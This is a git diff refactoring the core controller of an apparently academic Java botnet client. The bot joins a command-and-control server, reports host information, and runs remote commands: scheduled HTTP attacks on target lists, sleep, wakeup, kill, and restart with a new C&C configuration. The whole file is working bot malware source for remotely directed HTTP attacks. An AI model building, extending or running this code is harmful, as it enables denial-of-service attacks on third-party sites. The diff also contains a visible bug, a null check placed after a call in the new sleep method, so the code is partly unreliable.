@@ -32,19 +32,17 @@ import com.acmutv.botnet.config.serial.AppConfigurationFormat;
 import com.acmutv.botnet.core.analysis.Analyzer;
 import com.acmutv.botnet.core.analysis.NetworkAnalyzer;
 import com.acmutv.botnet.core.analysis.SystemAnalyzer;
-import com.acmutv.botnet.core.attack.HttpAttacker;
+import com.acmutv.botnet.core.attack.HttpAttack;
 import com.acmutv.botnet.core.control.Controller;
 import com.acmutv.botnet.core.control.command.BotCommand;
 import com.acmutv.botnet.core.control.command.BotCommandService;
 import com.acmutv.botnet.core.control.command.CommandScope;
 import com.acmutv.botnet.core.exception.*;
-import com.acmutv.botnet.core.pool.BotPool;
+import com.acmutv.botnet.core.exec.QuartzPool;
 import com.acmutv.botnet.core.report.*;
-import com.acmutv.botnet.core.state.BotState;
-import com.acmutv.botnet.core.target.HttpTarget;
+import com.acmutv.botnet.core.exec.BotState;
 import com.acmutv.botnet.log.AppLogMarkers;
 import com.acmutv.botnet.tool.io.IOManager;
-import com.acmutv.botnet.tool.net.HttpMethod;
 import com.acmutv.botnet.tool.runtime.RuntimeManager;
 import com.acmutv.botnet.tool.net.ConnectionManager;
 import com.acmutv.botnet.tool.time.Duration;
@@ -52,14 +50,13 @@ import com.acmutv.botnet.tool.time.Interval;
 import com.fasterxml.jackson.core.JsonProcessingException;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
+import org.quartz.SchedulerException;
 
 import java.io.IOException;
 import java.net.SocketException;
 import java.net.UnknownHostException;
 import java.util.ArrayList;
-import java.util.HashMap;
 import java.util.List;
-import java.util.Map;
 import java.util.concurrent.TimeUnit;
 
 import static com.acmutv.botnet.core.control.command.CommandScope.*;
@@ -77,17 +74,17 @@ public class CoreController {
   /**
    * The bot ID.
    */
-  public static String ID;
+  private static String ID;
 
   /**
    * The bot state.
    */
-  public static BotState STATE;
+  private static BotState STATE;
 
   /**
    * The bot thread pool.
    */
-  private static BotPool POOL;
+  private static QuartzPool POOL;
 
   /**
    * The configured analyzers.
@@ -171,7 +168,7 @@ public class CoreController {
    * Initializes the bot, giving it an identity.
    * @throws  BotInitializationException when errors during initialization.
    */
-  public static void initializeBot() throws BotInitializationException {
+  private static void initializeBot() throws BotInitializationException {
     LOGGER.traceEntry("Initializing bot...");
     try {
       generateId();
@@ -187,7 +184,7 @@ public class CoreController {
    * Establishes a connection with the controller and make the bot join the botnet.
    * @throws  BotInitializationException when errors during botnet joining.
    */
-  public static void joinBotnet() throws BotInitializationException {
+  private static void joinBotnet() throws BotInitializationException {
     if (AppConfigurationService.getConfigurations().getControllers().isEmpty()) {
       LOGGER.warn("No controller specified. Loading fallback controller...");
       AppConfigurationService.getConfigurations().getControllers().add(AppConfiguration.FALLBACK_CONTROLLER);
@@ -237,7 +234,7 @@ public class CoreController {
    * @throws BotMalformedCommandException when command parameters are malformed.
    * @throws BotExecutionException when command cannot be correctly executed.
    */
-  public static void executeCommand(final BotCommand cmd)
+  private static void executeCommand(final BotCommand cmd)
       throws BotMalformedCommandException, BotExecutionException {
     LOGGER.traceEntry("cmd={}", cmd);
     LOGGER.info("Received command {} with params={}", cmd.getScope(), cmd.getParams());
@@ -245,35 +242,26 @@ public class CoreController {
     switch (cmd.getScope()) {
 
       case ATTACK_HTTP:
-        final HttpMethod method = (HttpMethod) cmd.getParams().get("method");
-        @SuppressWarnings("unchecked")
-        final List<HttpTarget> targets = (List<HttpTarget>) cmd.getParams().get("targets");
-        if (method == null) {
-          throw new BotMalformedCommandException("Cannot execute command ATTACK_HTTP: param [method] is null");
-        }
-        if (targets == null) {
-          throw new BotMalformedCommandException("Cannot execute command ATTACK_HTTP: param [targets] is null");
-        } else {
-          for (HttpTarget target : targets) {
-            if (target.getUrl() == null) {
-              throw new BotMalformedCommandException("Cannot execute command ATTACK_HTTP: param [targets.target.url] is null");
-            }
-          }
+        final List<HttpAttack> httpAttacks = (List<HttpAttack>) cmd.getParams().get("attacks");
+        if (httpAttacks == null) {
+          throw new BotMalformedCommandException("Cannot execute command ATTACK_HTTP: param [attacks] is null");
         }
 
         final Interval attackHttpDelay = (Interval) cmd.getParams().get("delay");
         if (attackHttpDelay != null) {
-          waitBeforeCommand(attackHttpDelay.getRandomDuration(), KILL);
+          delayCommand(attackHttpDelay.getRandomDuration(), KILL);
         }
 
-        scheduleHttpAttack(method, targets);
+        for (HttpAttack attack : httpAttacks) {
+          attackHttp(attack);
+        }
 
         break;
 
       case CALMDOWN:
         final Interval calmdownDelay = (Interval) cmd.getParams().get("delay");
         if (calmdownDelay != null) {
-          waitBeforeCommand(calmdownDelay.getRandomDuration(), CALMDOWN);
+          delayCommand(calmdownDelay.getRandomDuration(), CALMDOWN);
         }
 
         calmdown();
@@ -281,14 +269,14 @@ public class CoreController {
         break;
 
       case KILL:
-        final Interval killTimeout = (Interval) cmd.getParams().get("timeout");
+        final Boolean killWait = (Boolean) cmd.getParams().getOrDefault("wait", false);
 
         final Interval killDelay = (Interval) cmd.getParams().get("delay");
         if (killDelay != null) {
-          waitBeforeCommand(killDelay.getRandomDuration(), KILL);
+          delayCommand(killDelay.getRandomDuration(), KILL);
         }
 
-        kill(killTimeout.getRandomDuration());
+        kill(killWait);
 
         break;
 
@@ -298,19 +286,21 @@ public class CoreController {
           throw new BotMalformedCommandException("Cannot execute command RESTART: param [resource] is null/empty");
         }
 
+        final Boolean restartWait = (Boolean) cmd.getParams().getOrDefault("wait", false);
+
         final Interval restartDelay = (Interval) cmd.getParams().get("delay");
         if (restartDelay != null) {
-          waitBeforeCommand(restartDelay.getRandomDuration(), RESTART);
+          delayCommand(restartDelay.getRandomDuration(), RESTART);
         }
 
-        restartBot(resource);
+        restartBot(resource, restartWait);
 
         break;
 
       case SAVE_CONFIG:
         final Interval saveConfigDelay = (Interval) cmd.getParams().get("delay");
         if (saveConfigDelay != null) {
-          waitBeforeCommand(saveConfigDelay.getRandomDuration(), SAVE_CONFIG);
+          delayCommand(saveConfigDelay.getRandomDuration(), SAVE_CONFIG);
         }
 
         saveConfig();
@@ -319,16 +309,27 @@ public class CoreController {
 
       case SLEEP:
         final Interval sleepTimeout = (Interval) cmd.getParams().get("timeout");
-        if (sleepTimeout == null) {
-          throw new BotMalformedCommandException("Cannot execute command SLEEP: param [timeout] is null");
-        }
 
         final Interval sleepDelay = (Interval) cmd.getParams().get("delay");
         if (sleepDelay != null) {
-          waitBeforeCommand(sleepDelay.getRandomDuration(), SLEEP);
+          delayCommand(sleepDelay.getRandomDuration(), SLEEP);
         }
 
-        sleep(sleepTimeout.getRandomDuration());
+        if (sleepTimeout == null) {
+          sleep(null);
+        } else {
+          sleep(sleepTimeout.getRandomDuration());
+        }
+
+        break;
+
+      case WAKEUP:
+        final Interval wakeupDelay = (Interval) cmd.getParams().get("delay");
+        if (wakeupDelay != null) {
+          delayCommand(wakeupDelay.getRandomDuration(), WAKEUP);
+        }
+
+        wakeup();
 
         break;
 
@@ -339,22 +340,72 @@ public class CoreController {
   }
 
   /**
-   * Waits the specified delay before the specified command execution.
-   * @param delay the time to wait.
-   * @param scope the command to wait for.
+   * Executes command {@code ATTACK_HTTP}.
+   * @param attack the HTTP attack details.
+   * @throws BotExecutionException when te attack cannot be scheduled.
    */
-  private static void waitBeforeCommand(Duration delay, CommandScope scope) {
-    final long amount = delay.getAmount();
-    final TimeUnit unit = delay.getUnit();
-    LOGGER.info("Waiting before command {} with delay {} {}", scope, amount, unit);
+  private static void attackHttp(HttpAttack attack) throws BotExecutionException {
+    LOGGER.traceEntry("attack={}", attack);
+    LOGGER.info("Scheduling attack...");
+    attack.getProperties().putIfAbsent("User-Agent", AppConfigurationService.getConfigurations().getUserAgent());
     try {
-      unit.sleep(amount);
-    } catch (InterruptedException ignored) {}
+      POOL.scheduleAttackHttp(attack);
+    } catch (SchedulerException exc) {
+      throw new BotExecutionException("Cannot schedule attack. %s", exc.getMessage());
+    }
+    LOGGER.info("Attack scheduled");
   }
 
+  /**
+   * Executes command {@code CALMDOWN}.
+   * @throws BotExecutionException when the bot cannot calm down.
+   */
+  private static void calmdown() throws BotExecutionException {
+    LOGGER.info("Calming down bot...");
+    try {
+      POOL.calmdown();
+    } catch (SchedulerException exc) {
+      throw new BotExecutionException("Cannot calmdown. %s", exc.getMessage());
+    }
+    LOGGER.info("Bot calmed down");
+  }
 
   /**
-   * Saves the current configuration as default.
+   * Executes command {@code KILL}.
+   * @param wait if true, waits for job to complete; if false destroy the scheduler immediately.
+   * @throws BotExecutionException when bot cannot be killed.
+   */
+  private static void kill(boolean wait) throws BotExecutionException {
+    LOGGER.traceEntry("wait={}", wait);
+    freeResources(wait);
+    LOGGER.info("Bot shut down");
+    changeState(BotState.DEAD);
+    LOGGER.traceExit();
+  }
+
+  /**
+   * Executes command {@code RESTART}.
+   * @param resource the path to the CONTROLLERS initialization resource.
+   * @param wait if true, waits for jobs to complete; if false, kills immediately
+   * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
+   */
+  private static void restartBot(String resource, boolean wait) throws BotExecutionException {
+    LOGGER.info("Restarting bot with CC at {}...", resource);
+    AppConfiguration newConfig;
+    try {
+      newConfig = AppConfigurationService.from(AppConfigurationFormat.JSON, resource, null);
+    } catch (IOException exc) {
+      throw new BotExecutionException("Cannot restart bot with C&C at %s. %s", resource, exc.getMessage());
+    }
+    freeResources(wait);
+    AppConfigurationService.getConfigurations().copy(newConfig);
+    LOGGER.trace("Bot restarted with configuration {}", AppConfigurationService.getConfigurations());
+    changeState(BotState.JOIN);
+    LOGGER.traceExit();
+  }
+
+  /**
+   * Executes command {@code SAVE_CONFIG}.
    * @throws BotExecutionException when configuration cannot be saved.
    */
   private static void saveConfig() throws BotExecutionException {
@@ -367,6 +418,56 @@ public class CoreController {
     }
     LOGGER.info("Current configuration saved to file {}...", configPath);
   }
+
+  /**
+   * Executes command {@code SLEEP}
+   * @param timeout the time period to sleep.
+   * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
+   */
+  private static void sleep(Duration timeout) throws BotExecutionException {
+    LOGGER.traceEntry("timeout={}", timeout);
+    if (timeout.getAmount() <= 0) {
+      throw new BotExecutionException("Cannot sleep a negative amount of time");
+    }
+
+    LOGGER.info("Falling asleep{}...",
+        (timeout == null) ? "" : String.format(" (timeout: %s)", timeout));
+    changeState(BotState.SLEEP);
+    try {
+      POOL.pause();
+    } catch (SchedulerException exc) {
+      throw new BotExecutionException("Cannot pause jobs. %s", exc.getMessage());
+    }
+    if (timeout != null) {
+      try {
+        timeout.getUnit().sleep(timeout.getAmount());
+        POOL.resume();
+      } catch (InterruptedException exc) {
+        throw new BotExecutionException("Cannot complete sleeping. %s", exc.getMessage());
+      } catch (SchedulerException exc) {
+        throw new BotExecutionException("Cannot resume jobs. %s", exc.getMessage());
+      }
+      LOGGER.info("Awake");
+      changeState(BotState.EXECUTION);
+    }
+    LOGGER.traceExit();
+  }
+
+  /**
+   * Executes command {@code WAKEUP}.
+   * @throws BotExecutionException when bot cannot be waken up.
+   */
+  private static void wakeup() throws BotExecutionException {
+    LOGGER.trace("Waking up...");
+    try {
+      POOL.resume();
+    } catch (SchedulerException exc) {
+      throw new BotExecutionException("Cannot resume jobs. %s", exc.getMessage());
+    }
+    LOGGER.info("Awake");
+    changeState(BotState.EXECUTION);
+  }
+
   /**
    * Generates the bot ID [MAC_ADDRESS]-[JVM-NAME].
    * @throws SocketException when MAC cannot be read.
@@ -398,79 +499,17 @@ public class CoreController {
   }
 
   /**
-   * Executes the command `KILL`.
-   * All resources are released within the specified timeout.
-   * @param timeout the time to shutdown.
+   * Waits {@code delay} before the execution of the command with {@code scope}.
+   * @param delay the time to wait.
+   * @param scope the command to wait for.
    */
-  private static void kill(Duration timeout) {
-    LOGGER.traceEntry("timeout={}", timeout);
-    LOGGER.info("Shutting down the bot (timeout: {} {})...", timeout.getAmount(), timeout.getUnit());
-    freeResources(timeout);
-    LOGGER.info("Bot shut down");
-    changeState(BotState.DEAD);
-    LOGGER.traceExit();
-  }
-
-  /**
-   * Executes the bot command `RESTART`.
-   * @param resource the path to the CONTROLLERS initialization resource.
-   * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
-   */
-  private static void restartBot(String resource) throws BotExecutionException {
-    LOGGER.info("Restarting bot with CC at {}...", resource);
-    AppConfiguration newConfig;
+  private static void delayCommand(Duration delay, CommandScope scope) {
+    final long amount = delay.getAmount();
+    final TimeUnit unit = delay.getUnit();
+    LOGGER.info("Waiting before command {} with delay {} {}", scope, amount, unit);
     try {
-      newConfig = AppConfigurationService.from(AppConfigurationFormat.JSON, resource, null);
-    } catch (IOException exc) {
-      throw new BotExecutionException("Cannot restart bot with C&C at %s. %s", resource, exc.getMessage());
-    }
-    freeResources(null);
-    AppConfigurationService.getConfigurations().copy(newConfig);
-    LOGGER.trace("Bot restarted with configuration {}", AppConfigurationService.getConfigurations());
-    changeState(BotState.JOIN);
-    LOGGER.traceExit();
-  }
-
-  /**
-   * Executes the command `SLEEP`.
-   * @param timeout the time period to sleep.
-   * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
-   */
-  private static void sleep(Duration timeout) throws BotExecutionException {
-    LOGGER.traceEntry("timeout={}", timeout);
-    if (timeout.getAmount() <= 0) {
-      LOGGER.traceExit();
-      return;
-    }
-    LOGGER.info("Sleeping (timeout: {} {})...", timeout.getAmount(), timeout.getUnit());
-    changeState(BotState.SLEEP);
-    POOL.pause(timeout);
-    try {
-      timeout.getUnit().sleep(timeout.getAmount());
-    } catch (InterruptedException exc) {
-      throw new BotExecutionException("Cannot complete sleeping. %s", exc.getMessage());
-    }
-    LOGGER.info("Awake");
-    changeState(BotState.EXECUTION);
-    LOGGER.traceExit();
-  }
-
-  /**
-   * Schedules a HTTP attack against the specified targets with the specified method.
-   * @param method the HTTP method (GET or POST).
-   * @param targets the list of targets to attack.
-   */
-  private static void scheduleHttpAttack(HttpMethod method, List<HttpTarget> targets) {
-    LOGGER.traceEntry("method={} targets={} proxy={}", method, targets);
-    LOGGER.info("Scheduling attack...");
-    final Map<String,String> props = new HashMap<>();
-    props.put("User-Agent", AppConfigurationService.getConfigurations().getUserAgent());
-    targets.forEach(target -> {
-      HttpAttacker attacker = new HttpAttacker(method, target, props);
-      POOL.submit(attacker);
-    });
-    LOGGER.info("Attack scheduled");
-    LOGGER.traceExit();
+      unit.sleep(amount);
+    } catch (InterruptedException ignored) {}
   }
 
   /**
@@ -478,7 +517,7 @@ public class CoreController {
    * @return the local host analysis report.
    * @throws BotAnalysisException when local host analysis cannot be correctly executed.
    */
-  public static Report makeReport() throws BotAnalysisException {
+  private static Report makeReport() throws BotAnalysisException {
     LOGGER.trace("Producing host analysis report...");
     Report report = new SimpleReport();
     for (Analyzer analyzer : ANALYZERS) {
@@ -512,58 +551,6 @@ public class CoreController {
   }
 
   /**
-   * Allocates bot's resources.
-   */
-  private static void allocateResources() {
-    LOGGER.trace("Allocating resources...");
-
-    POOL = new BotPool();
-
-    if (AppConfigurationService.getConfigurations().isSysInfo()) {
-      Analyzer systemAnalyzer = new SystemAnalyzer();
-      //TODO configure system features analyzer
-      ANALYZERS.add(systemAnalyzer);
-    }
-
-    if (AppConfigurationService.getConfigurations().isNetInfo()) {
-      Analyzer networkAnalyzer = new NetworkAnalyzer();
-      //TODO configure network features analyzer
-      ANALYZERS.add(networkAnalyzer);
-    }
-
-    if (AppConfigurationService.getConfigurations().isSysStat()) {
-      //TODO configure system statistics analyzer
-    }
-
-    if (AppConfigurationService.getConfigurations().isNetStat()) {
-      //TODO configure network statistics analyzer
-    }
-
-    LOGGER.trace("Resources allocated");
-  }
-
-  /**
-   * Deallocates bot's resources.
-   * If timeout is specified, resources are deallocated softly.
-   * If timeout is not specified, resources are deallocated immediately.
-   * @param timeout the timeout for resources deallocation (null for immediate deallocation).
-   */
-  private static void freeResources(Duration timeout) {
-    LOGGER.traceEntry("timeout={}", timeout);
-    POOL.kill(timeout);
-    LOGGER.traceExit();
-  }
-
-  /**
-   * Changes the bot state.
-   * @param state the new state.
-   */
-  private static void changeState(BotState state) {
-    LOGGER.traceEntry("state={}", state.getName());
-    STATE = state;
-  }
-
-  /**
    * Make the bot sleep for the specified duration.
    * @param timeout the sleeping period.
    * @throws InterruptedException when the sleeping is interrupted.
@@ -576,12 +563,69 @@ public class CoreController {
   }
 
   /**
-   * Executes command `CALMDOWN`.
+   * Changes the bot state.
+   * @param state the new state.
    */
-  private static void calmdown() {
-    LOGGER.info("Calming down bot...");
-    POOL.calmdown();
-    LOGGER.info("Bot calmed down");
+  private static void changeState(BotState state) {
+    LOGGER.traceEntry("state={}", state.getName());
+    STATE = state;
+  }
+
+  /**
+   * Allocates bot's resources.
+   * @throws BotInitializationException when the scheduler cannot be initialized.
+   */
+  private static void allocateResources() throws BotInitializationException {
+    LOGGER.trace("Allocating resources...");
+
+    LOGGER.trace("Initializing scheduler..");
+    try {
+      POOL = new QuartzPool();
+    } catch (SchedulerException exc) {
+      throw new BotInitializationException("Bot scheduler cannot be initialized. %s", exc.getMessage());
+    }
+    LOGGER.trace("Scheduler initialized");
+
+    LOGGER.trace("Initializing analyzers");
+    if (AppConfigurationService.getConfigurations().isSysInfo()) {
+      Analyzer systemAnalyzer = new SystemAnalyzer();
+      //TODO configure system features analyzer
+      ANALYZERS.add(systemAnalyzer);
+    }
+
+    if (AppConfigurationService.getConfigurations().isNetInfo()) {
+      Analyzer networkAnalyzer = new NetworkAnalyzer();
+      //TODO configure network features analyzer
+      ANALYZERS.add(networkAnalyzer);
+    }
+    LOGGER.trace("Analyzers initialized");
+
+    LOGGER.trace("Initializing samplers...");
+    if (AppConfigurationService.getConfigurations().isSysStat()) {
+      //TODO configure system statistics analyzer
+    }
+
+    if (AppConfigurationService.getConfigurations().isNetStat()) {
+      //TODO configure network statistics analyzer
+    }
+    LOGGER.trace("Samplers initialized");
+
+    LOGGER.trace("Resources allocated");
+  }
+
+  /**
+   * Frees bot's resources.
+   * @param wait if true, waits for job to complete; if false, frees resources immediately.
+   * @throws BotExecutionException when resources cannot be freed.
+   */
+  private static void freeResources(boolean wait) throws BotExecutionException {
+    LOGGER.trace("Freeing resources {} waiting for jobs to complete...", wait ? "" : "not");
+    try {
+      POOL.destroy(wait);
+    } catch (SchedulerException exc) {
+      throw new BotExecutionException("Cannot free resources. %s", exc.getMessage());
+    }
+    LOGGER.trace("Resources freed");
   }
 
 }
